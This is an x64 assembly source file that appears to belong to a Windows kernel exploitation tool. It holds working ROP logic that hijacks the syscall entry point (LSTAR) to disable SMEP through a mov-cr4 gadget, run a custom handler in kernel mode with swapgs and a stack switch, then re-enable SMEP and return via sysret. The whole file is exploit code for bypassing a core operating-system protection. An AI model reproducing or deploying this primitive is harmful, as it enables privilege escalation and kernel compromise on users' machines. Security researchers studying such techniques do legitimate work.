.data
	; offsets into _KPCR/_KPRCB
	m_kpcr_rsp_offset dq	0h		
	m_kpcr_krsp_offset dq	0h
	m_system_call dq		0h

	m_mov_cr4_gadget dq 0h
	m_sysret_gadget  dq 0h
	m_pop_rcx_gadget dq 0h

	m_smep_on  dq	0h
	m_smep_off dq	0h

	; all of these are setup by the c++ code...
	public m_smep_on
	public m_smep_off

	public m_kpcr_rsp_offset
	public m_kpcr_krsp_offset

	public m_pop_rcx_gadget
	public m_mov_cr4_gadget
	public m_sysret_gadget
	public m_system_call

.code
syscall_handler proc
	cli															; smep is disabled and LSTAR is still not restored at this point...													; we dont want the thread schedular to smoke us...
	swapgs														; swap gs to kernel gs, and switch to kernel stack...
	mov gs:m_kpcr_rsp_offset, rsp
	mov rsp, gs:m_kpcr_krsp_offset

	push rcx													; push RIP
	push r11													; push EFLAGS
	mov rcx, r10												; swapped by syscall...

	sub rsp, 020h
	; call msrexec_handler
	add rsp, 020h

	pop r11														; pop EFLAGS
	pop rcx														; pop RIP
	mov rsp, gs:m_kpcr_rsp_offset								; restore rsp...
	swapgs
	sti															; we will be enabling smep in the next return...
	mov rax, m_smep_on											; cr4 will be set to rax in the next return...
	ret
syscall_handler endp

syscall_wrapper proc
	push r10			
	mov r10, rcx												; rcx contains RIP after syscall instruction is executed...	
	push m_sysret_gadget										; rop to sysret...

	lea rax, finish												; push rip back into rax...
	push rax
	push m_pop_rcx_gadget

	push m_mov_cr4_gadget										; enable smep...
	push m_smep_on
	push m_pop_rcx_gadget

	lea rax, syscall_handler									; rop from mov cr4 gadget to syscall handler...
	push rax

	push m_mov_cr4_gadget										; rop from syscall handler to enable smep again...
	push m_smep_off												; gets pop'ed into rcx by gadget at LSTAR...
	syscall
finish:
	pop r10	
	ret
syscall_wrapper endp
end